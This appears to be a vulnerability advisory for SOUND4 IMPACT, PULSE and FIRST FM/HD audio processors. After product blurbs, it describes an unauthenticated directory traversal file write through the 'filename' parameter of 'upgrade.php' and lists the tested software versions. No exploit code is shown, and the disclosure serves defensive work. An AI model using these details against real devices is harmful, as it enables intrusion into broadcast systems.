Summary: The SOUND4 IMPACT introduces an innovative process - mono and
stereo parts of the signal are processed separately to obtain perfect
consistency in terms of both sound and level. Therefore, in moving
reception, when the FM receiver switches from stereo to mono and back to
stereo, the sound variations and changes in level are reduced by over 90%.
In the SOUND4 IMPACT processing chain, the stereo expander can be used
substantially without any limitations.

With its advanced functionalities and impressive versatility, SOUND4
PULSE gives clients the ultimate price - performance ratio, providing
much more than just a processor. Flexible and powerful, it ensures perfect
sound quality and full compatibility with radio broadcasting standards
and can be used simultaneously for FM and HD, DAB, DRM or streaming.

SOUND4 FIRST provides all the most important functionalities you need
in an FM/HD processor and sets the bar high both in terms of performance
and affordability. Designed to deliver a sound of uncompromising quality,
this tool gives you 2-band processing, a digital stereo generator and an
IMPACT Clipper.

Desc: The application suffers from an unauthenticated directory traversal
file write vulnerability. Input passed through the 'filename' POST parameter
called by the 'upgrade.php' script is not properly verified before being used
to upload .upgbox Firmware files. This can be exploited to write to arbitrary
locations on the system via directory traversal attacks.

Tested on: Apache/2.4.25 (Unix)
           OpenSSL/1.0.2k
           PHP/7.1.1
           GNU/Linux 5.10.43 (armv7l)
           GNU/Linux 4.9.228 (armv7l)
